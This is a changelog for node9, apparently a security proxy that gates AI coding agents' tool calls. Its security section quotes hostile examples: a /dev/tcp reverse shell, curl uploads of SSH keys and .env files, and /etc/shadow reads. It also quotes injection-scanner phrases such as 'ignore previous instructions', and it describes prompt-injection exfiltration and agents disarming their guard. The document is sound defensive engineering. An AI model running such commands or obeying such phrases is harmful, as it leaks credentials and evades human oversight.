# Changelog

**Release notes for every version, including all 2.x releases, are on
[GitHub Releases](https://github.com/node9-ai/node9-proxy/releases).** They are
generated on each release, so they are complete and current. The version
entries in this file stop at v1.19.3; what follows is the Unreleased section
kept by hand and the notes for older versions.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).

---

## Unreleased

### Security

- **Nine real-world evasions closed** (node9Firewall#372, group A). A redirect to `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT` is a network destination for the egress policy, the SSRF floor and the exposure gate (`bash -i >& /dev/tcp/h/4444 0>&1` passed every one of them). An HTTP upload of a jailed file is a reviewed copy out of the credential jail: `curl -T F`, `-d @F`, `--data-binary @F`, `-F name=@F`, `--data-urlencode name@F`, `--json @F`, `wget --post-file`/`--body-file`, also through `find -exec`; measured at the real gate, `curl -T ~/.ssh/id_rsa https://x/` was allowed in the shipped default. The realtime PII gate also reads a JSON-unescaped view of each argument, so a card or an SSN after an escaped newline in a typed request body is seen. A BIP-39 phrase joined with `+` (a query string) is read like one with spaces. `Database Connection String` judges a placeholder by its password, not by a stopword such as `example` in the host. An unquoted Windows drive path (`cat C:\Users\x\.ssh\id_rsa`) keeps its backslashes in the jail reader. Command words spelt with fullwidth or Cyrillic look-alike letters are folded into a third reading for the smart rules; data words stay as written. A loopback or private address written in a disguised form (`0x7f000001`, `2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]`) is reviewed even with the strict tier off; `127.0.0.1`, `[::1]` and the typed shorthand `127.1` stay reachable, and an enabled egress policy with `allowPrivate` is not asked. npm: when a package's abbreviated registry document is over the 2 MB cap (nx), the version document names the version and its scripts instead of leaving the package with no version, which read as "has known malicious versions" whenever a record covered any version.
- **More personal and bank data is seen** (node9Firewall#372 B1-B3, node9Firewall#385). Cards: Mastercard's 2-series (2221-2720, issued since 2017), JCB, Mir, Diners Club (14 digits), Visa's 13- and 19-digit lengths, and a dot as a separator; Luhn is kept, a 15-digit Visa is left out on purpose. A US bank routing number next to its label (`routing`, `ABA`, `RTN`) with a valid 3-7-1 checksum. National identifiers with a check digit: Italian codice fiscale, Spanish DNI and NIE, Swiss AHV and UID, French NIR, and, when named as such nearby, Polish PESEL, Romanian CNP and the Swedish, Norwegian and Finnish personal numbers (bare 11- and 13-digit runs such as millisecond timestamps pass their date and check-digit rules too often to count alone). All three join the realtime PII gate (`data.pii`).
- **More credential shapes in tool arguments, all review** (node9Firewall#372 B4, node9Firewall#385). A 16-byte base64 literal under a `*key` name (an AES key written into code), Laravel's `APP_KEY=base64:`, a Mailgun key, a kubeadm bootstrap token, a database account password in `IDENTIFIED BY` or `WITH PASSWORD`; `aes_key`, `cipher_key` and `subscription_key` join the assigned-secret names, a backtick may close the name, `|` and an escaped slash may sit in the value, a value that mixes letters and digits needs 3.0 bits of entropy per character instead of 3.5, and a name that starts with `public` holds no credential. A Grafana API key (base64 JSON) and a PGP private key block (also DSA and ENCRYPTED PEM headers) block everywhere. The output secret scan (tool output, response text, history) also reads the decoded views of the text (base64, hex, percent), so an encoded credential a tool returns is a finding (B7).
- **Injection scanner vocabulary and precision** (node9Firewall#372 B5, X4, B6). The scanner also reads "prior commands/tasks", `OVERRIDE:`, "new directive", `[SYSTEM]`, `SYSTEM NOTE:`, a request to reveal the system prompt, "decode ... and execute", "call X with the url", and the exfiltration verbs forward and transmit, and shared, logged, submitted and reported in the past tense ("log in to", "report issues at" are how ordinary pages talk); a dot inside a host does not end the destination window, a dot that ends a sentence does. A phrase quoted as an example after a quoting word ("phrases such as 'ignore previous instructions'") is a mention, not a signal, and "your email" is a noun. With the scan on (`injectionScan.enabled`, off by default), the content a write tool or an MCP tool with a destination carries is scanned as well, and two signals route the call to review.
- **Sends through MCP tools reach the egress policy** (node9Firewall#372 B8). An MCP tool argument named `destination`, `endpoint`, `webhook`, `webhook_url` or `callback_url` whose value is a URL names a destination for the opt-in egress policy (`network.unknown-host`). A plain `url` does not: on a note-saving tool it is the page being saved. The SSRF floor keeps its closed list of tools.
- **Reading another account's home** (node9Firewall#372 B9). A read or a listing (`cat`, `less`, `ls`, `tree`, `find`) under `/root` by a user whose home is not `/root` asks for approval under `files.system-dirs` (rule `review-root-home-read`). A listing is not a read of file content: `ls -l /etc/shadow` stays quiet while `cat /etc/shadow` keeps its review.
- **Fewer interruptions** (node9Firewall#372 X1-X5). An IBAN that is the whole value of a `recipient`, `payee`, `to`, `iban` or `account` argument is where a payment goes and is judged by the exposure gate, not reported as leaked personal data by the PII gate; the same IBAN inside a longer text still is. A shell's literal `-c` payload (`sh -c 'ls -la'`, find's `-exec sh -c 'gzip "$1"' _ {} \;`) is judged by its content instead of reviewed as inline code on sight, and every smart rule is also tested against that payload (`bash -c 'git push --force'` meets review-force-push); the review stays for a dynamic payload, for one that runs a positional or evals, and for one that itself runs inline code, and the credential jail keeps reading every payload. `review-curl-pipe-shell` ends `sh` at a word boundary, so a quoted body containing `| Shipment` is not a pipe into a shell (node9Firewall#332). The IBAN validator checks the country's BBAN shape for 21 countries (a German BBAN is 18 digits), closing the hex-looking false-positive class the registry alone could not. Injection: see B5 above for the quoted-mention rule.
- **A script written in the session and then run is judged from its content** (node9Firewall#372 A3). The hook records the files a call writes (a file tool's path, a shell command's redirects, `tee`, `cp`, `sed -i`) with the daemon. When a later command runs one of them by path (`bash x.sh`, `sh -e x.sh`, `./x.sh`, `source x.sh`), the file as it is on disk is judged as a Bash command of its own by the file policy and the engine, and the stricter verdict wins, its reason naming the script. Without this every shell check could be stepped around by writing the command into a file first. A regular file of at most 64 KB; no daemon, no record or an unreadable file leaves the command judged as before.

- **A dot or a "0," in front of a card number no longer hides it** (follow-up to node9Firewall#333). The card detector treated a digit run after a leading `.` or a lone `0,` as a decimal fraction after any whitespace, `:`, `=`, quote or bracket, so `text=.<card>` passed. The exemption now holds only at the start of the text (`.479...`, `-.479...`, `0,479...`) and, for a comma decimal, after `;` (semicolon CSV). Over 994 local session transcripts the card findings did not change (34 before and after); a full-precision fraction written after `rate: .` is now read as a card at the Luhn rate (8,886 of 499,500 fractions k/n, n <= 1000), the price of closing the evasion.
- **Values passed through shell function arguments are followed** (node9Firewall#361). At each call of a function defined in the same script, its body is read again with `$1`, `$2`, `$@` bound to the call's literal arguments and the body's own `local x=$1` assignments recorded in order: by the file policy, by the credential jail and by the network destination extractors. A dynamic argument stays unknown, a body that uses `shift` gets no bindings, a call before the definition counts (bash binds names when they run), and a function that shadows a command hides nothing. The destination extractors also resolve literal top-level variables (`u=https://x; curl "$u"`) and now agree on wrapped commands (`sudo curl`). Bounded by call depth 4 and 256 body walks.
- **A system file sent in a request asks for approval** (`files.system-dirs`, rule `review-system-file-upload`). `curl -d @F`, `--data-binary @F`, `-F name=@F`, `-F name=<F`, `--data-urlencode name@F`, `-T F`, `--json @F`, `wget --post-file`/`--body-file`, HTTPie and xh file fields, `scp`/`rsync` to a remote, and a network tool's standard input (`nc host port < F`), when F is under a system directory, `/proc`, `/sys` or another user's `/root`, loopback destinations included. A project file (`-d @payload.json`) is not affected.
- **System directories** (`files.system-dirs`, review by default, every value configurable). A write, a new file or a removal under `/usr`, `/etc`, `/boot`, `/bin`, `/sbin`, `/lib`, `/lib64` or `/var/log` asks for approval, through Bash and the file tools alike. `/usr/local` and `/usr/src` (the working directory of the official Node and Python container images) are project space; the exemption holds only when every host-resolved spelling of the target is exempt. Downloads are writes of their output: `wget -O`, `wget -P`, `curl -o`, `curl -O --output-dir`, `curl -D`/`-c`, `aria2c -d/-o`; a server-chosen or templated name is any file in the directory, and a download into the home that names a startup file is a startup change. Reads and listings of system files are not part of the check. The stronger checks keep their attribution: system authentication changes stay a locked block, startup files their own review.
- **Four more credential shapes in tool arguments are reviewed.** An HTTP `Basic` value that decodes to `user:password` with a generated password (prose and documentation pairs such as `admin:changeme` stay allowed); the secret of an OTP constructor (`ROTP::TOTP.new('...')`, `pyotp.TOTP("...")`, tutorial secrets excepted); `Assigned Secret` inside JSON escaped in a string literal (`\"access_token\":\"...\"`); and the names `consumer_key`, `APP_KEY`, signing, encryption and master keys, `jsapi_ticket` and a `*_PASS` variable. All four are review, never block, and apply to tool arguments only. A `pass` must start a part of the name (`bypass`, `compass_version` are other words); a name ending in `fingerprint`, `thumbprint` or `checksum` is a derivative; a value that is the right side of a string concatenation (`'+secrets.token_hex(16)`) is code. On the public split of a benchmark of labelled credential lines the gate stops 51 more of 524 credentials and no more of 946 look-alikes; over 67,632 tool calls in local session transcripts it changed one verdict.
- **The package check covers seven more ecosystems** (node9Firewall#360). `gem install`, `bundle add`, `cargo add` / `cargo install`, `go get` / `go install` / `go run pkg@version`, `dotnet add package`, `dotnet tool install`, `nuget install`, `mvn dependency:get` (also through `./mvnw`), `composer require` / `create-project`, and `code` / `codium` / `cursor --install-extension` are read like npm and pip installs, and the package is checked against OSV's malicious-package records: a listed version blocks, an install without a version of a package with malicious versions asks for review. The local index syncs RubyGems, crates.io, Go, NuGet, Maven, Packagist and VSCode (both marketplaces) beside npm and PyPI. A Go package path is looked up by its module prefixes; names with look-alike Unicode letters are read, not skipped. No registry is asked for these ecosystems: the age and install-script signals stay npm and PyPI only, and a RubyGems name is no longer sent to PyPI's registry.
- **Sends after reading outside content are judged by destination** (node9Firewall#318, phase 1). A session that reads an email, a web page, an issue or any MCP tool result is _exposed_, whether or not the text looked hostile. After that, a call that sends is held for approval when its destination appeared in what was read, or is an outside address, host or IBAN this session does not know; a send inside the organisation (`policy.untrustedContent.orgDomains`), to an address the user typed in a prompt, to a trusted recipient (`node9 trust recipient add`), to a trusted or allow-listed host, or to a destination approved earlier in the session (`afterExposure: "ask-once"`, the default) is logged and allowed. A destructive call with no destination (`delete_*`, `send_money`, `update_password` ...) is held; any other call with no destination is logged. Destinations are compared as written: addresses in any script, hosts from URLs with or without a scheme, IPv6 literals, IBANs with spaces or dashes, and IBAN-shaped account numbers whose checksum fails (a sandbox account). A repository's own config may tighten this check but not switch it off, log instead of ask, add an organisation domain or declare a tool harmless. A new built-in rule, `commands.node9-disarm` (review), covers `node9 session-exposure clear`, `node9 session-taint clear`, `node9 trust add`, `node9 pause`, `node9 shield disable|set`, `node9 egress allow` and `node9 approver set` when the agent runs them from the shell: they are the user's commands. Every source result is framed as data for the model with a random boundary and the line to tell the user when an instruction was ignored (`spotlight`, on by default); `injectionScan` still adds its warning and taint but no longer decides whether a call is held. One check in the catalog, `behavior.untrusted-content` (off / log / review). The exposure record lives in the daemon (`node9 session-exposure list|clear`), expires four hours after the last read, and fails open when the daemon is down. The session-taint and session-exposure daemon routes now require the daemon's internal token.
- **Exposure gate, review fixes before release** (node9Firewall#318). A redirect to `/dev/null` or `/dev/stderr` is not a write outside the project. A file written through an MCP filesystem tool is judged as a write (where it lands, what it carries), not as a send to every URL in its content. The gateway passes its working directory, so writes inside the project are not "outside", and applies the same roles as the hook (a tool the user classed as `read` marks nothing). An inline approval in Claude Code clears exactly the destinations and paths the review held, shell and writes included, so "ask once" holds there too. A shell send whose destination is built at run time (`curl -d @.env "$URL"`) is held after exposure. One known-destination test (organisation domains, the user's own words, trusted recipients, trusted hosts, `egress.allow`, the project's remotes and registries) serves sends, plain fetches and written content alike. A session that never read outside content no longer pays a daemon round trip on every file edit: a per-session marker under `~/.node9/exposure-sessions` is checked first. The trusted-recipients list is cached by modification time.
- **Writes after reading outside content** (node9Firewall#318, P4). After the session read an email, a web page or an issue, a write (Write, Edit, MultiEdit, a shell redirect, `tee`, `cp`, `sed -i`) is held for approval when it lands outside the project, on a file inside the project that runs code or instructs the agent (`.github/workflows`, `.gitlab-ci.yml`, `.claude`, `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.cursor`, `.mcp.json`, `.vscode/settings.json`, `.git/hooks`, `.husky`; `package.json` only when its `scripts` change), or when the written content carries a destination that appeared in what was read. An ordinary file inside the project is logged. The system's temp directory is not "outside the project" for a project that lives elsewhere. Protected system and startup files keep their own checks.
- **MCP tool annotations reach the hook, and add caution only** (node9Firewall#318, P2). The gateway now carries each tool's `readOnlyHint`, `destructiveHint`, `idempotentHint` and `openWorldHint` into the daemon's tool inventory, and the hook reads them by the server's name. A declared `destructiveHint` makes the call destructive: held after the session read outside content even when it names no destination. `readOnlyHint` or `openWorldHint: false` never relax a tool by themselves; only an explicit role (`policy.untrustedContent.roles`, or the dashboard's role column) does. Claude Code's own session and view servers (`ccd_*`, `visualize`) are read tools: their results are not outside content and their calls change nothing outside the machine.
- **"Allow + trust this address"** (node9Firewall#318, P5). A review held because the session read outside content offers, in `node9 tail` (`[s]`) and in the native popup ("Allow & trust"), to allow the call and trust its destinations for good: the exact addresses, hosts or accounts go to `~/.node9/trusted-recipients.json` (`addedBy: approval`) and the session's exposure is cleared for them. On a machine whose policy is the workspace's, the call is allowed once and nothing is written. Exposure cards do not offer "Always Allow" or "Trust 30m": a tool-wide standing allow answers the wrong question there. Claude Code's inline prompt names the command instead (`node9 trust recipient add <address>`). Windows keeps Yes/No.
- **Shell commands join the exposure gate** (node9Firewall#318, P3). A command that fetches (`curl`, `wget`, `gh issue view`, `gh pr diff`, `git pull`, `scp` from a remote) marks the session as having read outside content, with its output framed like any other source. A command that sends (`curl` with a body, upload or write method, `wget --post-data`, `scp`/`rsync` to a remote, `nc`, `ssh`, `gh issue comment`/`pr create`/`release upload`/`api -X POST`, `git push`, `npm`/`pnpm`/`yarn publish`, `twine upload`, `cargo publish`, `gem push`, `docker push`) is judged by destination after that: held when the host appeared in what was read or is not known, logged when it is the repository's own remote (read from `.git/config`), the registry of an ecosystem the project uses (`package.json` means npm), a trusted or allow-listed host, or an address the user typed. A plain fetch is held only when its host appeared in the content read, which is how a query string carries data out. Wrappers (`sudo`, `env`, `timeout`) and `sh -c` payloads are seen through; language one-liners are not read.
- **A review the session's history asks for is never answered by the daemon's background check** (node9Firewall#318, P1.1). On node9's own approver path (a `node9 tail` connected; the gateway; agents without inline ask), the daemon re-checks a held call in the background without the session id, so it cannot see a session taint or an exposure; for a call no rule names it answered the card `allow`, which the terminal racer took as a human decision. Exposure, session-taint, DLP and file reviews now register their card with the background check off, as app-permission reviews already did. Affects session taint since it shipped.
- **The exposure review says why everywhere.** The reason ("this session read an email ... this call sends to x@y, an address that appeared in that email") is the card's description in `node9 tail`, the native popup, Mission Control and Slack, not only in Claude Code's inline prompt. `behavior.untrusted-content` (off / log / review, tuning `afterExposure`, `spotlight`, `orgDomains`) and `commands.node9-disarm` can be set from a config file and from the dashboard. A wrapper (`sudo`, `env`, `timeout`, `nice`) in front of `curl` or `wget` no longer hides its destination from egress and the taint gate.
- **Session taint reaches MCP tools in the hook path** (node9Firewall#344). After a flagged tool result, a namespaced `mcp__<server>__<tool>` call from Claude Code is reviewed like a write or a network call; it was never checked before.
- **Shell startup and system authentication files** (node9Firewall#341). Three new checks, on by default and independent of shields and DLP: `files.shell-startup` reviews writes, replacements and removals of `~/.bashrc`, `~/.zshrc`, `~/.profile` and `~/.bash_profile` (also under `/root`); `files.system-auth` blocks, without override, any change to `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/gshadow`, `/etc/sudoers` and everything under `/etc/security`, `/etc/pam.d` and `/etc/sudoers.d`; `files.password-hashes` reviews reads and copies of `/etc/shadow` and `/etc/gshadow`. One operation-aware policy decides for Bash and for the file tools (Read, Write, Edit, MultiEdit and their MCP spellings), with redirects, tee, cp/mv/install/ln, rm/unlink/shred/truncate, sed -i, dd, touch, find actions, wrappers, nested `sh -c`/`eval`/`su -c` payloads, heredocs, variables and `cd` tracking resolved statically. Reading `/etc/passwd` or `/etc/sudoers` with an identified read is no longer blocked by the path DLP; unclassified tools keep the old block.
- **Shell commands sent to MCP executors are inspected like Bash** (node9Firewall#338). Tools named `exec`, `run_command`, `terminal` or any Bash alias, bare or as `mcp__<server>__<name>`, with a `command`, `cmd` or `script` string reach the same shell analysis; `tools.inspection` accepts `{ "kind": "shell", "field": "input.script" }` for other names. An identified executor whose command cannot be read (missing, non-string, two disagreeing fields) is held for approval instead of allowed. Runtime-generated program names (`$(printf rm)`, `$CMD`, `/bin/{rm,}`, decoded commands piped into a shell) fall under `commands.eval-dynamic`; a dynamic directory with a literal program name (`$HOME/.cargo/bin/cargo`) does not.
- **Credentials named by context are reviewed** (node9Firewall#348). Two argument-gate patterns, both at review and never block: `Credential in URL Query` for a generated-looking value under a query key that names a secret (`?apiKey=`, `&secret=`, `&sig=`, the `secret` of an `otpauth://` URI) and `Assigned Secret` for a generated-looking value assigned to a telling name (`JWT_SECRET=`, `password:`, `"api_key":`). A value counts as generated when it is 12 characters or longer (16 for a base32 OTP secret), not a placeholder, reference, email, identifier, joined words or a sequential run, and has 3.5 bits of entropy per character (3.0 in a URL); a vendor-shaped value whose checksum fails stays allowed, and a fixture or derivative name (`FAKE_TOKEN`, `token_hash`, `password_length`) is not a finding. Only the tool-call gate uses these patterns: prompts, tool output, history scans, output redaction and response text do not, so a prompt that mentions `PWD=` is never blocked. A workspace that sets `dlp.reviewAction` to `block` turns these reviews into blocks. `Database Connection String` now accepts a driver suffix (`mysql+pymysql://`, `postgresql+psycopg2://`). On Samsung CredData, node9 stops about 200 of 641 credentials instead of 60, with 4 of 1,224 look-alikes instead of 3. Audit rows whose arguments the gate flags are stored hashed, as for any other finding.
- **Encoded credentials in arguments and URLs are detected.** Argument DLP now decodes percent, base64, base64url, hex, escaped and delimited hex, base32 and zero-width-split views, inspects URL userinfo, path segments, query values, fragments and hostname labels, and recognises English BIP-39 recovery phrases with a valid checksum (published reference vectors excepted). Every existing validator and placeholder rule runs on the decoded view, so documentation examples stay allowed. Raw text is matched in full; a payload whose structure could not be inspected (more than 16,384 nodes, deeper than 12 levels, beyond 1 MiB) is held for approval.

- **MCP weakening tools are gated.** node9's MCP server now refuses _weakening_ tools — `node9_shield_disable` and `node9_approver_set` — over MCP **by default**, so a compromised agent can't disarm node9 through node9's own MCP server. A human runs them from the CLI; opt in with `settings.mcpAllowWeakening: true`. Every MCP tool is now explicitly classified (`readonly` / `add` / `weaken`), enforced by a test so a newly added tool can't silently default to `readonly` and bypass the gate.
  - **Operational note:** `node9 mcp-server` is **long-lived** — your agent app (Claude Code, Cursor, …) spawns it once and keeps it running. After updating node9 (or changing `mcpAllowWeakening`), **restart the agent app** (or reconnect MCP) so it re-spawns the server with the new code/config. Rebuilding node9 or restarting the node9 daemon does **not** reload a running server.

### Added

- **Actions that move money, change access or publish in an app are asked about by default; Stripe and PayPal get shields of their own** (node9Firewall#385, node9Firewall#390). Three checks, on at review by default: `actions.money` (refunds, payouts, transfers, charges, invoices, subscriptions, disputes, cards, withdrawals), `actions.access` (passwords, keys and tokens, roles and permissions, membership, accounts, second factors, sharing) and `actions.publish` (releases, packages, deploys, posts, visibility). They catch these actions on any MCP server no app shield claims: an internal billing server, a vendor without a shield, a universal connector. Reads are never asked about. Set any of them to off, log or block with `checks` in the config. The `stripe` and `paypal` shields (off by default) cover one app through every door: its MCP server (a rule can now be scoped to a server with `server` / `notServer`, matched against the gateway's label or the `mcp__<server>__` name), the `stripe` CLI, a write to `api.stripe.com` or the live PayPal API, and the Stripe or PayPal library in a script the agent wrote. A server one of them claims stays out of the general checks even while the shield is off, so turning Stripe off makes Stripe quiet without touching PayPal. `finance`, `identity` and `publishing`, shipped as shields in 2.37.0, are now these checks; `node9 shield enable finance` says so. The publishing template's shell rules (`npm publish`, `twine upload`, `docker push`, `gh release` and the rest, however they are spelled) are not a general check: each names a registry, which is an app, and they become doors of that app's shield; until then they are off by default, as in 2.37.0. A shipped shield regex the runtime would refuse (longer than 256 characters) now fails the load instead of silently never matching.

- **Posture auto-ships to the dashboard.** The daemon now pushes the posture scorecard (secrets exposure, open egress, destructive-command gate self-test) to your node9 dashboard on every cloud-sync tick (daemon start + ~5 h) and on a manual `node9 policy sync` — so a logged-in machine's posture stays current without running `node9 posture --ship`. Mirrors the existing blast/scan auto-ship: fire-and-forget, never blocks sync, same redacted payload (no file paths). Only ships when logged in (`node9 login`); opt out with `NODE9_POSTURE_DISABLE=1` (sibling of `NODE9_BLAST_DISABLE` / `NODE9_SCAN_DISABLE`).

- **Inline review prompts** (`reviewChannel` / `--ask`). On a `review` verdict, node9 now routes the approve/deny prompt to the agent's **own inline prompt** instead of node9's separate approver — no frozen session, no 60 s hook-timeout race, no terminal context-switch (resolves node9-ai/node9-proxy#209). Verified live against the agents whose hook contract supports it: **Claude Code** (`hookSpecificOutput.permissionDecision:"ask"`) and **GitHub Copilot CLI** (flat `permissionDecision:"ask"`).
  - Config: `settings.reviewChannel: "ask" | "approver"`; CLI override `--ask` / `--no-ask`. **Default is `"ask"`** for the two supported agents **except when a cloud approver is configured** — node9 never bypasses SaaS org-policy / second-party approval (matches the orchestrator's defer guard). All other agents (Codex, Antigravity, Gemini, Hermes, Cursor, OpenCode, Pi) keep node9's own approver — they either error on or fail open to `ask`, so node9 never sends them one.
  - node9 stays the decision-maker — the full evaluator waterfall runs unchanged; only the prompt _surface_ moves. The short-circuit happens before the SaaS handshake, so no orphaned dashboard/Slack approval is created. `node9 monitor` shows these as a `review` activity.
  - Taint/exfil-driven reviews are excluded from inline `ask` (forced to the routed approver — self-approval is weakest exactly where exfiltration risk is highest).

- **Richer audit on batch-shipped rows (Phase B).** `editFilePath`, `loopCount` and `transcriptPath` now ride the **batch** audit rows (previously only live `/intercept` rows carried them). Additive, optional, cheap to compute at write time — a file path is not a secret (`BlastSnapshot` already ships paths). Unlocks the dashboard's exact **file-risk badge (Tier 2)** — a precise join from a touched file to the machine's exposed credential paths — and exact file nodes in the session graph. No watermark/eid change; historical rows stay lean; review/block rows were already rich via `/intercept`.

- **Taint provenance on blocked exfil rows (Phase D2).** When taint propagation blocks a read→use exfil chain, the block row now carries `taintFromEid` (the audit eid of the originating sensitive read) and `taintSource` (its label). `appendLocalAudit` returns its eid, `TaintRecord` carries `fromEid`, and the daemon serializes the whole record so the link round-trips with no per-hop plumbing. The dashboard turns this into a **causal edge** in the session graph ("this credential read → that egress was blocked"), so a session's exfil attempt reads as one story instead of two unrelated rows.

### Changed

- **A machine connected to a workspace now follows the workspace configuration for policy — one configuration, one place to change it.** Previously a connected machine merged its local files with the workspace's and kept whichever was stricter. Now, if the machine is logged in with a workspace key, its policy is the workspace configuration plus node9's shipped defaults; the local files stop deciding policy. `node9 status`, `doctor`, `explain`, `shield list/status`, `egress`, `jail list` and the node9 MCP tools all name the source and mark local files "present — ignored", and local policy commands (`shield enable/disable/set`, `egress watch/lock/allow/deny/off`, `jail add/remove`, `trust add/remove`) refuse with a non-zero exit and point at the dashboard instead of writing a file nobody reads.

  **Read this before upgrading a connected machine.** Anything your local files add that the workspace does not say is dropped, and some of it is invisible because there is no dashboard field for it yet. What goes away on a connected machine:
  - **shields you enabled locally** (`~/.node9/shields.json`) — only workspace-mandated shields run, _including the credential jails_ (`project-jail`, `user-jail`)
  - **jail paths** added with `node9 jail add`, and **trusted hosts** added with `node9 trust add`
  - **local egress settings** — if the workspace has no egress policy, egress control is off
  - **rules and word lists in your local config**: `smartRules`, `dangerousWords`, `ignoredTools`, `sandboxPaths`, `toolInspection`, `environments` — none of these are expressible in the workspace configuration today, so they are dropped with no dashboard equivalent
  - `NODE9_MODE` no longer overrides the mode on a connected machine

  **Do this first:** open the dashboard → Devices → **"Add this device's setup to the workspace"** on the machine whose setup should govern the fleet, and confirm the workspace carries your shields and egress settings. Then upgrade. Verify with `node9 status` (it names the policy source) and `node9 shield status` (it lists what is actually enforced).

  **Want a machine to keep deciding for itself?** Connect it with `node9 login --local`. It ships audit and telemetry to the dashboard as before, and its policy stays local. Named profiles (`NODE9_PROFILE`) behave the same way. `node9 logout` also returns full local control.

- **Review prompts are inline by default for Claude Code + GitHub Copilot** (see above). Existing users get this on upgrade with no re-setup; add `--no-ask` or set `"reviewChannel":"approver"` to keep node9's own approver. No change for any other agent or for cloud-approver setups.

- **GitHub Copilot CLI integration** (`node9 agents add copilot`). Adds the GitHub Copilot CLI (`copilot`, npm `@github/copilot`) — the terminal agent, distinct from the VS Code Copilot extension which stays under the `vscode` MCP target — to the protected agents at the hooks tier. node9 writes a dedicated `~/.copilot/hooks/node9.json` with PreToolUse/PostToolUse/UserPromptSubmit hooks (`node9 check/log --agent copilot`, `timeoutSec: 600`) and adds/wraps the node9 MCP server in `~/.copilot/mcp-config.json`. All verified live against Copilot CLI 1.0.60:
  - Copilot's PascalCase hook payload is byte-identical to Claude Code (`hook_event_name`/`session_id`/`cwd`/`tool_name`/`tool_input`) and its shell tool is already `bash` with `{command}` args — so node9's existing extractors, canonicalisation, shields, DLP and snapshot work unchanged. No new payload dialect.
  - Because the payload is indistinguishable from Claude, attribution is pinned via the `--agent copilot` flag node9 registers (a hand-written hook missing the flag harmlessly attributes to Claude Code — protection is identical).
  - Blocks emit Copilot's flat `{permissionDecision:"deny", permissionDecisionReason}` (exit 0), which surfaces the reason to the model. preToolUse is fail-closed (a node9 crash/timeout denies the tool).
  - `node9 init` / `detectAgents` discovers Copilot via `~/.copilot` or the `copilot` binary in PATH.
  - `node9 scan` reads Copilot session event logs (`~/.copilot/session-state/*/events.jsonl`) for offline DLP/rule/loop analysis.

- **Antigravity integration** (`node9 agents add antigravity`, alias `agy`). Adds Google Antigravity — the Gemini CLI successor (consumer/free tiers stop serving 2026-06-18) — to the set of protected agents, at the hooks tier. One setup covers both the agy CLI and the Antigravity IDE: PreToolUse/PostToolUse hooks (`node9 check/log --agent antigravity`, 600 s timeout) land in the shared `~/.gemini/config/hooks.json` and the node9 MCP entry + wrapping in `~/.gemini/config/mcp_config.json`. All protocol behaviors verified live against agy 1.0.6:
  - agy's hook payload is a third dialect — tool name/args nest under `toolCall`, the shell tool is `run_command` with PascalCase `CommandLine`/`Cwd` args, and there is no `hook_event_name`. New `canonicalToolInput` maps args to Claude vocabulary at the boundary so shields, DLP and snapshot work unchanged.
  - Blocks emit `{"decision":"deny","reason":…}` — agy silently ignores the Claude block shape and runs the tool (fail-open), so the `--agent` flag pins the response shape deterministically. The deny reason reaches the model verbatim (negotiation loop intact).
  - PostToolUse fires on non-tool steps with `toolCall: null` — `node9 log` skips them instead of writing junk audit rows.
  - `node9 init` / `detectAgents` now discriminates agy from the legacy Gemini CLI inside the shared `~/.gemini` root (settings.json vs antigravity-\*/ dirs, plus `agy`-binary PATH fallback) — fixes a silent protection gap where an agy-only machine was reported gemini-wired while agy ran unguarded.
  - `node9 scan` reads Antigravity brain transcripts (`~/.gemini/antigravity-{cli,ide}/brain/*/.system_generated/logs/transcript_full.jsonl`) for offline DLP/rule/loop analysis.
  - `node9 setup gemini` and `node9 agents list` warn about the Gemini CLI EOL; `node9 setup antigravity` offers cleanup of legacy node9 hooks left in `~/.gemini/settings.json`.

- **Pi integration** (`node9 agents add pi`). Adds Pi (https://pi.dev, `@earendil-works/pi-coding-agent`) to the set of AI coding agents Node9 protects, alongside Claude Code, Gemini, Cursor, Codex, Windsurf, VSCode, Claude Desktop, and Opencode. `node9 init` auto-detects an installed pi (via `~/.pi/agent/` or `pi` binary in PATH — covers the Bun-compiled binary case where the config dir is created lazily on first launch) and drops a CommonJS extension shim at `~/.pi/agent/extensions/node9.js`. The shim wires four pi hooks:
  - `tool_call` — blocks via return value `{ block: true, reason }` (pi's contract, not throw — distinct from Opencode)
  - `tool_result` — fire-and-forget audit log
  - `input` — prompt DLP; blocks via `{ action: "handled" }` + `ctx.ui.notify`
  - `user_bash` (`!` / `!!` prefix) — the prompt-escape side channel; synthesizes a `Bash`-shaped PreToolUse payload so the same dangerous-words and DLP rules engage, blocks by returning a synthetic failed `BashResult` (pi's `UserBashEventResult` has no `block` field by design)

  Pi tool names are normalized inside the shim (`bash`→`Bash`, `read`→`Read`, …) before the payload reaches `node9 check`, so existing PascalCase policy rules engage without edits. Pi has no MCP client, so unlike Opencode setup, no `mcp.node9` entry is written — only the extension file.

  Self-heal: `node9 init` rewrites the shim when its embedded `NODE9_SHIM_VERSION` differs from the installed node9. Design doc: `doc/roadmap/pi-integration.md`.

### Fixed

- **An approval timeout of 0 means "no timer" everywhere.** The hook treated `approvalTimeoutMs: 0` as "no timer", but the daemon read it as a 0 ms timer, so a card in `node9 tail` was denied before anyone could see it and a person's decision then had nowhere to go. The daemon now arms no auto-deny timer for 0 and tells the tail there is no countdown; an unset value keeps the 120 s default. The hook's wait for the daemon follows the configured timeout instead of a fixed 120 s (a longer timeout used to lose its tail card at 120 s), and a wait that runs out now counts as a failed channel instead of leaving the approval hanging. `node9 posture` reports 0 as "node9 never times a review out": a review nobody answers waits until the agent's own hook timeout, and some agents then run the tool.
- **Rules in a project's `node9.config.json` are enforced as configured.** When a project rule held a call for approval, the daemon could in some setups answer the approval itself with only the global configuration, and the call ran without the review the rule asked for. This happened with `node9 tail` connected (a project block rule turned into a review) or with approvals routed to node9's own approver (agents without an inline prompt, the MCP gateway, `reviewChannel: approver`). The daemon no longer re-checks an approval that node9 raised; it waits for a person, the approval timeout or the organisation. The Python SDK's calls are checked with the SDK's own working directory. Restart the daemon after upgrading (`node9 daemon restart`).
- **One record of who decided each approval.** Every approval is decided in one place, the daemon, and once: a later answer can no longer overwrite an earlier one, a decision made before the hook asked for it is no longer lost ("Approval Unavailable"), and a card no longer stays in `node9 tail` after it was decided. The agent, the audit log, `node9 report` and the dashboard read who decided (a person and where: `node9 tail`, `node9 monitor` or the desktop popup; the approval timeout; the organisation; a rule) from that record instead of guessing from the label. `node9 report` counts each approval once.
- **`node9 monitor`'s trust key trusts the tool for 30 minutes.** It used to be read as a permanent deny of the whole tool. A decision in `node9 monitor` now counts as a person's.
- **The recovery choice "Redirect AI" in `node9 tail` reaches the agent.** The agent gets the person's instruction; before, it got a generic block without it.
